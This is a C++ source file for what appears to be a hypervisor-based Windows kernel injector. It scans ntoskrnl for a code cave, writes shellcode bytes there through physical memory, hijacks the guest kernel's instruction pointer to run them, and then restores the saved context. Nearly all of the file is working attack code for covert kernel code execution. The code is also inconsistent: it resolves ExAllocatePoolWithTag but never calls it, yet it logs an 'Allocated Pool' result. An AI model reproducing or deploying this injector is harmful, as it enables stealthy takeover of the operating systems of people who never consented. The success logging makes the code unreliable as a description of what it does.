#include "injector.h"
#include "../arch/arch.h"
#include "../crt/crt.h"
#include "../loader/loader.h"
#include "../loader/scan.h"
#include "../logs/logs.h"
#include "../memory_manager/memory_manager.h"


namespace injection {

uint8_t Injector::scan_done = 0;
uint8_t Injector::injection_done = 0;
uint64_t Injector::g_codecave_pa = 0;
uint64_t Injector::g_codecave_va = 0;
uint64_t Injector::g_backup_rip = 0;
uint64_t Injector::g_backup_rsp = 0;
uint64_t Injector::g_backup_rflags = 0;
trap_frame_t Injector::g_backup_context = {};
uint64_t Injector::next_injection_attempt = 0;

constexpr uint64_t SCAN_THRESHOLD = 20000;
constexpr uint64_t INJECT_THRESHOLD = 20050;

void Injector::handle_bsp_deployment(trap_frame_t *trap_frame,
                                     uint64_t vmexit_count,
                                     uint64_t ntoskrnl_base) {
  // Stage 1.5-A: Scan for Codecave
  if (scan_done == 0 && vmexit_count >= SCAN_THRESHOLD) {
    if (ntoskrnl_base != 0) {
      logs::print("[Runtime] Stage 1.5-A: Scanning for Codecave...\n");
      // Hardcoded size 80 is safe for now
      const auto result = loader::scan::find_codecave(80, ntoskrnl_base);
      if (result.pa != 0) {
        g_codecave_pa = result.pa;
        g_codecave_va = result.va;
        logs::print("[Runtime] Codecave found. PA:0x%p, VA:0x%p\n",
                    g_codecave_pa, g_codecave_va);
      } else {
        logs::print("[Runtime] Codecave scan failed.\n");
      }
      scan_done = 1;
    }
  }

  // Stage 1.5-B: Inject Shellcode
  if (injection_done == 0 && scan_done == 1 && g_codecave_pa != 0 &&
      vmexit_count >= INJECT_THRESHOLD &&
      vmexit_count >= next_injection_attempt) {

    try_inject(trap_frame, vmexit_count, ntoskrnl_base);
  }
}

void Injector::try_inject(trap_frame_t *trap_frame, uint64_t vmexit_count,
                          uint64_t ntoskrnl_base) {
  const uint8_t cpl = arch::get_guest_cpl();
  const uint64_t current_rip = arch::get_guest_rip();

  // STRICT FILTER: Kernel Mode (CPL=0) AND Kernel RIP (High Virtual Address)
  // Windows Kernel Space usually starts at 0xFFFF8... or 0xFFFFF...
  const bool is_kernel_rip = (current_rip >= 0xFFFFF80000000000);

  if (cpl != 0 || !is_kernel_rip) {
    // [Debug] Skip User Mode / Invalid Context
    // Backoff: Wait for 50 more exits before retrying
    next_injection_attempt = vmexit_count + 50;

    logs::print("[Runtime] Skipping Hijack Candidate: RIP=0x%p CPL=%d "
                "(Retrying in 50 exits)\n",
                current_rip, cpl);
    return;
  }

  // If we are here, we are in Kernel Mode (CPL=0).
  logs::print("[Runtime] Stage 1.5-B: Injecting Shellcode (Valid Kernel "
              "Context: RIP=0x%p, CPL=%d)...\n",
              current_rip, cpl);

  // 1. Resolve ExAllocatePoolWithTag
  const uint64_t ex_alloc =
      loader::get_kernel_export(ntoskrnl_base, "ExAllocatePoolWithTag");

  if (ex_alloc) {
    inject_minimal_shellcode(trap_frame, ex_alloc);
  } else {
    logs::print("[Runtime] Failed to resolve ExAllocatePoolWithTag.\n");
    // Mark done to avoid spamming resolve failure
    injection_done = 1;
  }
}

void Injector::inject_minimal_shellcode(trap_frame_t *trap_frame,
                                        uint64_t ex_allocate_pool) {
  // 2. Generate Shellcode [TEST: MINIMAL DIAGNOSTIC]
  // User Request: Force Enable Interrupts (STI) + Minimal Payload (Verified
  // BSOD Fix)
  uint8_t code[] = {
      0xFB,                                     // sti (Force Enable Interrupts)
      0x48, 0xC7, 0xC0, 0x00, 0x50, 0x00, 0x00, // mov rax, 0x5000
      0x48, 0xB9, 0x37, 0x13, 0x37, 0x13, 0x37,
      0x13, 0x37, 0x13, // mov rcx, MAGIC
      0x31, 0xD2,       // xor rdx, rdx
      0x0F, 0xA2        // cpuid
  };

  // Critical: Use sizeof to avoid truncation
  uint32_t code_size = sizeof(code);

  // 3. Map Codecave & Write
  void *mapped_cave = memory_manager::map_host_physical(g_codecave_pa);

  uint64_t page_offset = g_codecave_pa & 0xFFF;
  uint64_t size_left = 0x1000 - page_offset;

  if (mapped_cave && size_left >= code_size) {
    crt::copy_memory(mapped_cave, code, code_size);
    logs::print("[Runtime] Minimal Shellcode written to PA:0x%p\n",
                g_codecave_pa);

    // 4. Hijack RIP & Backup Context
    g_backup_rip = arch::get_guest_rip();
    g_backup_rsp = arch::get_guest_rsp();       // Explicitly backup RSP
    g_backup_rflags = arch::get_guest_rflags(); // Save Flags
    g_backup_context = *trap_frame;             // Member-wise copy

    arch::set_guest_rip(g_codecave_va);

    // [USER REQUEST] Force Enable Interrupts
    // Avoid BSOD (DRIVER_IRQL_NOT_LESS_OR_EQUAL) by allowing interrupt
    // processing
    arch::set_guest_rflags(g_backup_rflags | 0x200); // Force IF (Bit 9) = 1
    arch::clear_guest_interruptibility();

    logs::print("[Runtime] HIJACKED: RIP 0x%p -> 0x%p (IF Forced Enabled)\n",
                g_backup_rip, g_codecave_va);
    injection_done = 1;
  } else {
    logs::print("[Runtime] Failed to map Codecave for writing.\n");
    // Don't mark injection_done, retry next time? Or fail?
    // Failure to map is critical, mark done to avoid loop
    injection_done = 1;
  }
}

bool Injector::handle_shellcode_return(trap_frame_t *trap_frame) {
  // Magic Check: RAX=0x5000, RCX=Magic
  if (trap_frame->rax == 0x5000 && trap_frame->rcx == 0x1337133713371337) {
    uint64_t result = trap_frame->rdx; // Result passes in RDX
    logs::print("[Runtime] SHELLCODE SUCCESS! Allocated Pool: 0x%p\n", result);

    restore_context(trap_frame);
    return true; // Indicate handled
  }
  return false;
}

void Injector::restore_context(trap_frame_t *trap_frame) {
  if (g_backup_rip != 0) {
    *trap_frame = g_backup_context; // Restore GPRs

    // Restore Guest Context, RFLAGS & RIP (Absolute Restoration)
    // Original flags are restored here, potentially disabling IF back to
    // original state if original code was disabled. This is correct behavior.
    arch::set_guest_rflags(g_backup_rflags);
    arch::set_guest_rsp(g_backup_rsp);
    arch::set_guest_rip(g_backup_rip);

    logs::print("[Runtime] Guest execution restored to 0x%p (Full Context)\n",
                g_backup_rip);

    // Clear backup (optional, but good for cleanliness)
    // g_backup_rip = 0;
  } else {
    arch::advance_guest_rip(); // Fallback
  }
}

} // namespace injection
